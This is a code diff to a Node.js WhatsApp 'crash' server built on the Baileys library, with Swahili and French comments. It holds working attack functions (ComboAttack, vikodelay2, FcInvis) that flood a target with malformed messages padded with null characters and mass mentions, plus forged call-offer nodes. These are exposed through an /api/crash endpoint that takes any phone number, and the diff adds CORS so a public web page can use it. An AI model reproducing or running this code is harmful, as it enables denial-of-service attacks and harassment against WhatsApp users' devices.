@@ -1,5 +1,6 @@
 const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, delay, encodeSignedDeviceIdentity, jidDecode } = require("@whiskeysockets/baileys");
 const express = require("express");
+const cors = require("cors");
 const fs = require("fs");
 const crypto = require("crypto");
 const pino = require("pino");
@@ -7,11 +8,31 @@ const pino = require("pino");
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-app.use(express.json());
+// ✅ CORS : autorise GitHub Pages et les tests locaux
+app.use(cors({
+  origin: [
+    "https://abc2284.github.io",
+    "http://localhost:3000",
+    "http://127.0.0.1:3000"
+  ],
+  methods: ["GET", "POST"],
+  credentials: false
+}));
+
+app.use(express.json({ limit: "10mb" }));
 app.use(express.static(__dirname));
 
 app.get("/", (req, res) => {
   res.sendFile(__dirname + "/index.html");
+});
+
+// ✅ Healthcheck pour vérifier que le serveur tourne
+app.get("/api/health", (req, res) => {
+  res.json({
+    success: true,
+    whatsapp: !!global.sock,
+    registered: global.sock?.authState?.creds?.registered || false
+  });
 });
 
 const loadUsers = () => {
@@ -54,7 +75,7 @@ app.post("/api/change-role", (req, res) => {
 });
 
 // ==========================================
-// 1. FUNCTION YA KWANZA: COMBO ATTACK
+// 1. COMBO ATTACK
 // ==========================================
 async function ComboAttack(sock, target) {
   try {
@@ -158,7 +179,7 @@ async function ComboAttack(sock, target) {
 }
 
 // ==========================================
-// 2. FUNCTION YA PILI: VIKODELAY2
+// 2. VIKODELAY2
 // ==========================================
 async function vikodelay2(sock, target) {
   try {
@@ -168,7 +189,7 @@ async function vikodelay2(sock, target) {
         expectedVideoCount: 0,
       }
     }, {});
-    
+
     const imagePayload = {
       imageMessage: {
         url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
@@ -181,23 +202,23 @@ async function vikodelay2(sock, target) {
         fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
         directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&_nc_hot=1758521044",
         mediaKeyTimestamp: 1758521043,
-        isSampled: true, 
-        viewOnce: false, 
+        isSampled: true,
+        viewOnce: false,
         contextInfo: {
           forwardingScore: 999,
-          isForwarded: true, 
+          isForwarded: true,
           forwardedNewsletterMessageInfo: {
-            newsletterJid: "120363399602691477@newsletter", 
-            newsletterName: "7eppeli", 
-            contentType: "UPDATE_CARD", 
-            accessibilityText: "\u0000".repeat(9000), 
+            newsletterJid: "120363399602691477@newsletter",
+            newsletterName: "7eppeli",
+            contentType: "UPDATE_CARD",
+            accessibilityText: "\u0000".repeat(9000),
             serverMessageId: 18888888
-          }, 
+          },
           mentionedJid: Array.from({ length: 2000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
         },
         scansSidecar: "/dx1y4mLCBeVr2284LzSPOKPNOnoMReHc4SLVgPvXXz9mJrlYRkOTQ==",
         scanLengths: [3599, 9271, 2026, 2778],
-        midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc=", 
+        midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc=",
         annotations: [
           {
             polygonVertices: [
@@ -211,22 +232,22 @@ async function vikodelay2(sock, target) {
               serverMessageId: 3868,
               newsletterName: "7eppeli",
               contentType: "UPDATE_CARD",
-              accessibilityText: "\u0000".repeat(1000) 
+              accessibilityText: "\u0000".repeat(1000)
             }
           }
         ]
       }
     };
-    
+
     const messages = [];
     for (let i = 0; i < 1000; i++) {
-      const imgMsg = await sock.generateWAMessageFromContent(target, imagePayload, {});  
-      imgMsg.message.messageContextInfo = {  
-        messageAssociation: {  
-          associationType: 1,  
-          parentMessageKey: album.key  
-        }  
-      };  
+      const imgMsg = await sock.generateWAMessageFromContent(target, imagePayload, {});
+      imgMsg.message.messageContextInfo = {
+        messageAssociation: {
+          associationType: 1,
+          parentMessageKey: album.key
+        }
+      };
       messages.push(imgMsg);
     }
 
@@ -234,7 +255,7 @@ async function vikodelay2(sock, target) {
       messageId: album.key.id,
       statusJidList: [target]
     });
-    
+
     for (const msg of messages) {
       await sock.relayMessage("status@broadcast", msg.message, {
         messageId: msg.key.id,
@@ -249,156 +270,156 @@ async function vikodelay2(sock, target) {
 }
 
 // ==========================================
-// 3. FUNCTION YA TATU: FC INVIS (Fixed & Secured)
+// 3. FC INVIS
 // ==========================================
 async function FcInvis(sock, target) {
-    console.log(`Inatuma shambulio la FcInvis kwenda kwa ${target}`);
+  console.log(`Inatuma shambulio la FcInvis kwenda kwa ${target}`);
 
-    let Reomsg = (
-        await sock.getUSyncDevices([target], false, false)
-    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
+  let Reomsg = (
+    await sock.getUSyncDevices([target], false, false)
+  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
 
-    await sock.assertSessions(Reomsg);
+  await sock.assertSessions(Reomsg);
 
-    let Rxcl = () => {
-        let map = {};
-        return {
-            mutex(key, fn) {
-                map[key] ??= { task: Promise.resolve() };
-                map[key].task = (async prev => {
-                    try { await prev; } catch { }
-                    return fn();
-                })(map[key].task);
-                return map[key].task;
-            }
-        };
+  let Rxcl = () => {
+    let map = {};
+    return {
+      mutex(key, fn) {
+        map[key] ??= { task: Promise.resolve() };
+        map[key].task = (async prev => {
+          try { await prev; } catch { }
+          return fn();
+        })(map[key].task);
+        return map[key].task;
+      }
     };
+  };
 
-    let Rxcl2 = Rxcl();
-    let Reomsg2 = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
-    let yntkts = sock.encodeWAMessage?.bind(sock);
+  let Rxcl2 = Rxcl();
+  let Reomsg2 = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
+  let yntkts = sock.encodeWAMessage?.bind(sock);
 
-    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
-        if (!recipientJids.length)
-            return { nodes: [], shouldIncludeDeviceIdentity: false };
+  sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
+    if (!recipientJids.length)
+      return { nodes: [], shouldIncludeDeviceIdentity: false };
 
-        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
+    let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
 
-        let ywdh = Array.isArray(patched)
-            ? patched
-            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));
+    let ywdh = Array.isArray(patched)
+      ? patched
+      : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));
 
-        let { id: meId, lid: meLid } = sock.authState.creds.me;
-        let omak = meLid ? jidDecode(meLid)?.user : null;
+    let { id: meId, lid: meLid } = sock.authState.creds.me;
+    let omak = meLid ? jidDecode(meLid)?.user : null;
 
-        let shouldIncludeDeviceIdentity = false;
+    let shouldIncludeDeviceIdentity = false;
 
-        let nodes = await Promise.all(
-            ywdh.map(async ({ recipientJid: jid, message: msg }) => {
-                let decodedJid = jidDecode(jid);
-                if (!decodedJid) return null;
-                let { user: targetUser } = decodedJid;
-                let ownDecoded = jidDecode(meId);
-                let ownPnUser = ownDecoded ? ownDecoded.user : null;
+    let nodes = await Promise.all(
+      ywdh.map(async ({ recipientJid: jid, message: msg }) => {
+        let decodedJid = jidDecode(jid);
+        if (!decodedJid) return null;
+        let { user: targetUser } = decodedJid;
+        let ownDecoded = jidDecode(meId);
+        let ownPnUser = ownDecoded ? ownDecoded.user : null;
 
-                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
-                let y = jid === meId || jid === meLid;
+        let isOwnUser = targetUser === ownPnUser || targetUser === omak;
+        let y = jid === meId || jid === meLid;
 
-                if (dsmMessage && isOwnUser && !y)
-                    msg = dsmMessage;
+        if (dsmMessage && isOwnUser && !y)
+          msg = dsmMessage;
 
-                let bytes = Reomsg2(yntkts ? yntkts(msg) : sock.encodeWAMessage(msg));
+        let bytes = Reomsg2(yntkts ? yntkts(msg) : sock.encodeWAMessage(msg));
 
-                return Rxcl2.mutex(jid, async () => {
-                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({
-                        jid,
-                        data: bytes
-                    });
+        return Rxcl2.mutex(jid, async () => {
+          let { type, ciphertext } = await sock.signalRepository.encryptMessage({
+            jid,
+            data: bytes
+          });
 
-                    if (type === 'pkmsg')
-                        shouldIncludeDeviceIdentity = true;
+          if (type === 'pkmsg')
+            shouldIncludeDeviceIdentity = true;
 
-                    return {
-                        tag: 'to',
-                        attrs: { jid },
-                        content: [{
-                            tag: 'enc',
-                            attrs: { v: '2', type, ...extraAttrs },
-                            content: ciphertext
-                        }]
-                    };
-                });
-            })
-        );
-
-        return {
-            nodes: nodes.filter(Boolean),
-            shouldIncludeDeviceIdentity
-        };
-    };
-
-    let {
-        nodes: destinations,
-        shouldIncludeDeviceIdentity
-    } = await sock.createParticipantNodes(
-        Reomsg,
-        { conversation: "y" },
-        { count: '0' }
+          return {
+            tag: 'to',
+            attrs: { jid },
+            content: [{
+              tag: 'enc',
+              attrs: { v: '2', type, ...extraAttrs },
+              content: ciphertext
+            }]
+          };
+        });
+      })
     );
 
-    let callNode = {
-        tag: "call",
-        attrs: {
-            to: target,
-            id: sock.generateMessageTag(),
-            from: sock.user.id
-        },
-        content: [{
-            tag: "offer",
-            attrs: {
-                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
-                "call-creator": sock.user.id
-            },
-            content: [
-                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
-                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
-                {
-                    tag: "video",
-                    attrs: {
-                        orientation: "0",
-                        screen_width: "1920",
-                        screen_height: "1080",
-                        device_orientation: "0",
-                        enc: "vp8",
-                        dec: "vp8"
-                    }
-                },
-                { tag: "net", attrs: { medium: "3" } },
-                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
-                { tag: "encopt", attrs: { keygen: "2" } },
-                { tag: "destination", attrs: {}, content: destinations },
-                ...(shouldIncludeDeviceIdentity
-                    ? [{
-                        tag: "device-identity",
-                        attrs: {},
-                        content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
-                    }]
-                    : []
-                )
-            ]
-        }]
+    return {
+      nodes: nodes.filter(Boolean),
+      shouldIncludeDeviceIdentity
     };
+  };
 
-    await sock.sendNode(callNode);
-    console.log(`Ufanisi wa FcInvis: ${target}`);
+  let {
+    nodes: destinations,
+    shouldIncludeDeviceIdentity
+  } = await sock.createParticipantNodes(
+    Reomsg,
+    { conversation: "y" },
+    { count: '0' }
+  );
+
+  let callNode = {
+    tag: "call",
+    attrs: {
+      to: target,
+      id: sock.generateMessageTag(),
+      from: sock.user.id
+    },
+    content: [{
+      tag: "offer",
+      attrs: {
+        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
+        "call-creator": sock.user.id
+      },
+      content: [
+        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
+        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
+        {
+          tag: "video",
+          attrs: {
+            orientation: "0",
+            screen_width: "1920",
+            screen_height: "1080",
+            device_orientation: "0",
+            enc: "vp8",
+            dec: "vp8"
+          }
+        },
+        { tag: "net", attrs: { medium: "3" } },
+        { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
+        { tag: "encopt", attrs: { keygen: "2" } },
+        { tag: "destination", attrs: {}, content: destinations },
+        ...(shouldIncludeDeviceIdentity
+          ? [{
+            tag: "device-identity",
+            attrs: {},
+            content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
+          }]
+          : []
+        )
+      ]
+    }]
+  };
+
+  await sock.sendNode(callNode);
+  console.log(`Ufanisi wa FcInvis: ${target}`);
 }
 
 // ==========================================
-// ROUTE YA API YA KUTUMA BUG KUPITIA WEBSITE
+// API ROUTE
 // ==========================================
 app.post("/api/crash", async (req, res) => {
   const { target, bug } = req.body;
-  
+
   if (!target) {
     return res.status(400).json({ success: false, message: "Weka namba ya target kwanza." });
   }
@@ -409,7 +430,9 @@ app.post("/api/crash", async (req, res) => {
   }
 
   try {
-    const formattedTarget = target.includes("@s.whatsapp.net") ? target : target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    const formattedTarget = target.includes("@s.whatsapp.net")
+      ? target
+      : target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
     if (bug === "FcInvis") {
       await FcInvis(activeSock, formattedTarget);
@@ -418,7 +441,7 @@ app.post("/api/crash", async (req, res) => {
     } else {
       await ComboAttack(activeSock, formattedTarget);
     }
-    
+
     res.json({ success: true, message: `Bug ya (${bug || 'Combo'}) imetumwa kwa mafanikio kwenda kwa ${target}` });
   } catch (err) {
     console.error("API Error:", err);
@@ -427,7 +450,7 @@ app.post("/api/crash", async (req, res) => {
 });
 
 // ==========================================
-// KUANZISHA WHATSAPP BOT KWENYE CLOUD SERVER
+// WHATSAPP BOT
 // ==========================================
 async function startBot() {
   const { state, saveCreds } = await useMultiFileAuthState("auth_info");
@@ -435,15 +458,15 @@ async function startBot() {
   const sock = makeWASocket({
     logger: pino({ level: "silent" }),
     auth: state,
-    printQRInTerminal: false
+    printQRInTerminal: false,
+    browser: ["Ubuntu", "Chrome", "20.0.04"]
   });
 
   global.sock = sock;
 
-  // Ikiwa bado haijasajiliwa, unaweza kuweka namba yako hapa chini kwenye mabano ili ipate Pairing Code moja kwa moja kupitia Logs za Render
   if (!sock.authState.creds.registered) {
-    const phoneNumber = "255651675994"; // <--- Weka namba yako hapa kama unahitaji pairing code mpya (Mfano: "255712345678")
-    
+    const phoneNumber = "255651675994"; // ⚠️ Remplace par ton numéro
+
     if (phoneNumber) {
       try {
         await delay(3000);
@@ -455,20 +478,16 @@ async function startBot() {
       } catch (err) {
         console.error("Hitilafu kuomba pairing code:", err);
       }
-    } else {
-      console.log("ℹ️ Weka namba ya simu kwenye variable ya 'phoneNumber' ndani ya server.js kama unahitaji pairing code mpya.");
     }
   }
 
   sock.ev.on("connection.update", (update) => {
     const { connection, lastDisconnect } = update;
-    
+
     if (connection === "close") {
       const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
       console.log("Muunganisho umekatika. Unajaribu kuunganisha tena...", shouldReconnect);
-      if (shouldReconnect) {
-        startBot();
-      }
+      if (shouldReconnect) startBot();
     } else if (connection === "open") {
       console.log("🔥 WhatsApp imeingia na kuunganishwa kwa mafanikio kwenye server!");
     }
